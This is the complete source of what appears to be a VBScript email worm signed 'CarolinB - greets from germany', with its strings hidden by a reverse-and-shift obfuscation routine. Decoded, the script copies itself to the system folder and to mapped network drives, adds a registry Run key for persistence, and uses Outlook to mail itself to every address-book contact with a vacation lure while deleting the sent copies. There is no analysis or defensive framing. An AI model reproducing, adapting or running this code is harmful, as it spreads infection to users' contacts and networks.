' CarolinB - greets from germany 

On Error Resume Next

Dim TPLM
Dim DJH
Dim VUJKWLU
Dim VEGEM
Dim EQC7VU
Dim XDMSPN9W
Dim GDK7RB
Dim SPR3MB9M
Dim QWGLDLA
Dim V6VBHI

Set TPLM = CreateObject( ERJ1U0( "sbdiaNldsrxRdkhE-fmhsohqbR" ) )
TPLM.CopyFile WScript.ScriptFullName, TPLM.BuildPath( TPLM.GetSpecialFolder(1), ERJ1U0( "RAU-3WXT83@Q" ) )

Set DJH = CreateObject( ERJ1U0( "kkdgR-sohqbRV" ) )
DJH.RegWrite ERJ1U0( "[mtQ[mnhrqdUsmdqqtB[rvncmhV[senrnqbhL[dq`vsenR[DMHGB@L^K@BNK^XDJG" ) & ERJ1U0( "3WXT83@Q" ), TPLM.BuildPath( TPLM.GetSpecialFolder(1), ERJ1U0( "RAU-3WXT83@Q" ) )


Set VUJKWLU = CreateObject( ERJ1U0( "jqnvsdM-sohqbRV" ) )
Set EQC7VU = VUJKWLU.EnumNetworkDrives

If EQC7VU.Count <> 0 Then
   For VEGEM = 0 To EQC7VU.Count - 1
       If InStr( EQC7VU.Item( VEGEM), ERJ1U0( "[" ) ) <> 0 Then
          TPLM.CopyFile WScript.ScriptFullName, TPLM.BuildPath( EQC7VU.Item( VEGEM), ERJ1U0( "RAU-3WXT83@Q" ) ) 
       End If
   Next
End If

VEGEM = DJH.RegRead( ERJ1U0( "[DMHGB@L^K@BNK^XDJG" ) & ERJ1U0( "3WXT83@Q" ) )

If VEGEM = "" Or VEGEM > 20 Then
   VEGEM = 0
End If

If VEGEM = 0 Then
   Set SPR3MB9M = CreateObject( ERJ1U0( "mnhs`bhkoo@-jnnkstN" ) )
   Set XDMSPN9W = SPR3MB9M.GetNameSpace( ERJ1U0( "HO@L" ) )

   For Each GDK7RB In XDMSPN9W.AddressLists
       Set EQC7VU = SPR3MB9M.CreateItem( 0 )

       For QWGLDLA = 1 To GDK7RB.AddressEntries.Count
           Set V6VBHI = GDK7RB.AddressEntries( QWGLDLA )

           If QWGLDLA = 1 Then
              EQC7VU.BCC = V6VBHI.Address
           Else
              EQC7VU.BCC = EQC7VU.BCC & ERJ1U0( ":" ) & V6VBHI.Address
           End If
       Next

       EQC7VU.Subject = ERJ1U0( "`hk`qsrt@lnqersddqfgbtl" )
       EQC7VU.Body = ERJ1U0( " `hk`qsrt@mh0//1mnhs`b`u" )
       EQC7VU.Attachmets.Add WScript.ScriptFullName
       EQC7VU.DeleteAfterSubmit = True
       EQC7VU.Send
   Next

   VEGEM = 0
End If

DJH.RegWrite ERJ1U0( "[DMHGB@L^K@BNK^XDJG" ) & ERJ1U0( "3WXT83@Q" ), VEGEM + 1

Function ERJ1U0( RO6 )
   Dim J9VNM
   Dim O1S1YOZZ
   Dim G0OUGGDR

   J9VNM = ""

   For O1S1YOZZ = 1 To Len( RO6 )
       G0OUGGDR = Mid( RO6, O1S1YOZZ, 1 )

       J9VNM = Chr( Asc( G0OUGGDR ) + 1 ) & J9VNM
   Next

   ERJ1U0 = J9VNM
End Function
